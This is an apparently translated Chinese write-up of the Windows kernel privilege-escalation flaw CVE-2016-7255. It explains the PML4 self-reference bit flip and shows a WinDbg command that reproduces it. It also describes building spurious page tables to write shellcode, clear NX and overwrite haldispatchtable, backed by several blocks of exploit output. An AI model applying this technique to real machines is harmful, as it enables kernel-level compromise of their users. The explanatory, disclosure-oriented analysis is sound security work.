### 代码示例

```python
print("PT: 0x%s" % (hex(pt)))
```

### 使用示例

```sh
./pagetables.py 0x0 0x1ed
Virtual Address: 0x0
Self reference index: 0x1ed
Page Tables
Self Ref:     0xfffff6fb7dbedf68L
Pml4:         0xfffff6fb7dbed000L
Pdpt:         0xfffff6fb7da00000L
Pd:           0xfffff6fb40000000L
Pt:           0xfffff68000000000L

./pagetables.py 0xfffff68000000000 0x1ed
Virtual Address: 0xfffff68000000000L
Self reference index: 0x1ed
Page Tables
Self Ref:     0xfffff6fb7dbedf68L
Pml4:         0xfffff6fb7dbedf68L
Pdpt:         0xfffff6fb7dbed000L
Pd:           0xfffff6fb7da00000L
Pt:           0xfffff6fb40000000L
```

### Windows 10 1607 版本中的漏洞（CVE-2016-7255）

在Windows 10 Build 1607（周年版）中，Windbg尚不支持随机化的PML4自引用地址。通过使用上述Python脚本，可以看出Windbg没有考虑随机化的PML4自引用索引。

```sh
./pagetables.py 0x00007ff6dd800000
Virtual Address: 0x7ff6dd800000
Self reference index: 0x1ed
Page Tables
Self Ref:     0xfffff6fb7dbedf68L
Pml4:         0xfffff6fb7dbed7f8L
Pdpt:         0xfffff6fb7daffed8L
Pd:           0xfffff6fb5ffdb760L
PT:           0xfffff6bffb6ec000L
```

如上所述，漏洞（CVE-2016-7255）允许我们对值进行异或操作（使用0x4）。这可以启用用户模式下的PML4e自引用地址访问，从而允许我们在用户空间中访问页表，进而读取和修改内存中的任何数据。

**注意：**
- 在“Before”部分中，第2位设置为零，由KW-V中的“K”或“kernel”表示。
- 在运行漏洞利用程序后，以地址0xFFFFF6FB7DBEDF68为目标，值0x30FED863被翻转为0x30FED867，使得能够在用户模式下访问，由UW-V中的“U”或“user”表示。

### Windows 8.1 示例

#### 之前
#### 之后

要在Windbg中复制漏洞利用的操作，可以使用以下命令：

```sh
r $t1 = FFFFF6FB7DBEDF68; eq $t1 poi($t1) | 0x4
```

创建新的页表来进行读写操作。现在，该条目已被改为允许用户模式访问。Enrique Nissim提出了一种方法：创建新的页表，使用物理地址和属性进行更新，从而实现任意内存地址的读写。

在这个例子中，地址0xffffffffffd00510只能从内核模式访问，这是由每个条目的第0x63位（位7-0：“01100011”，注意第2位为0）决定的。通过使用Enrique的代码，我们可以创建一个页表，允许从用户模式（“0x67”位7-0：“01100111”，通知第2位现在是1）访问，并指向与内核相同的内存：0x1163或在这种情况下为0x1000（记住清零位11-0）。

#### 之前
#### 之后

### 漏洞利用的输出

这是在Windows 7上运行漏洞利用程序的输出。

- 创建一个页表，允许读取`haldispatchtable+0x8`的值。
- 创建一个页表，允许将shellcode写入内核态内存，绕过SMEP和SMAP，并删除页表上的NX位以允许代码执行。
- 创建一个页表，允许覆盖`haldispatchtable+0x8`，这将触发代码执行。
- 读取将被替换的原始值（`haldispatchtable+0x8`）。

```sh
On a Windows 7 box:
[*] Getting Overwrite pointer: fffff80002c42c60
[+] Selected spurious PML4E: fffff6fb7dbedf00
[+] Spurious PT: fffff6fb7dbe0000
--------------------------------------------------
[+] Content pml4e fffff6fb7dbedf80: 199063
[+] Patching the Spurious Offset (PML4e) fffff6fb7dbedf00: 199067
[+] Content pdpte fffff6fb7dbf0000: 198063
[+] Patching the Spurious Offset (PDPTE) fffff6fb7dbedf00: 198067
[+] Content pdpe fffff6fb7e0000b0: 1dc063
[+] Patching the Spurious Offset (PDE) fffff6fb7dbedf00: 1dc067
[+] Content pte fffff6fc00016210: 8000000002c42963
[+] Patching the Spurious Offset (PTE) fffff6fb7dbedf00: 2c42967
OverwriteAddress: fffff6fb7dbe0c60
```

写入shellcode和删除NX位的输出：

```sh
Original OverwriteTarget pointer: fffff80002a438e8
[+] Selected spurious PML4E: fffff6fb7dbedf08
[+] Spurious PT: fffff6fb7dbe1000
--------------------------------------------------
[+] Content pml4e fffff6fb7dbedff8: 1ec063
[+] Patching the Spurious Offset (PML4e) fffff6fb7dbedf08: 1ec067
[+] Content pdpte fffff6fb7dbffff8: 1eb063
[+] Patching the Spurious Offset (PDPTE) fffff6fb7dbedf08: 1eb067
[+] Content pdpe fffff6fb7ffffff0: 1ea063
[+] Patching the Spurious Offset (PDE) fffff6fb7dbedf08: 1ea067
[+] Content pte fffff6ffffffe800: 100163
*** Patching the original location to enable NX...
[+] Patching the Spurious Offset (PTE) fffff6fb7dbedf08: 100167 
HAL address: fffff6fb7dbe1000
[+] w00t: Shellcode stored at: ffffffffffd00d50
```

覆盖exec目标的输出：

```sh
[+] Selected spurious PML4E: fffff6fb7dbedf10
[+] Spurious PT: fffff6fb7dbe2000
--------------------------------------------------
[+] Content pml4e fffff6fb7dbedf80: 199063
[+] Patching the Spurious Offset (PML4e) fffff6fb7dbedf10: 199067
[+] Content pdpte fffff6fb7dbf0000: 198063
[+] Patching the Spurious Offset (PDPTE) fffff6fb7dbedf10: 198067
[+] Content pdpe fffff6fb7e0000b0: 1dc063
[+] Patching the Spurious Offset (PDE) fffff6fb7dbedf10: 1dc067
[+] Content pte fffff6fc00016210: 8000000002c42963
[+] Patching the Spurious Offset (PTE) fffff6fb7dbedf10: 2c42967
Patch OverwriteTarget: fffff6fb7dbe2c68 with ffffffffffd00d50
```

### MS16-135 补丁

Microsoft于2016年11月8日发布了补丁MS16-135，以解决此漏洞。McAfee有一篇很好的文章详细介绍了如何修复此漏洞。

### 开发示范

- Windows 7 SP1 Workstation
- Windows 8.1 Workstation
- Windows 10 Build 1511 Workstation
- Windows 2012 R2 Server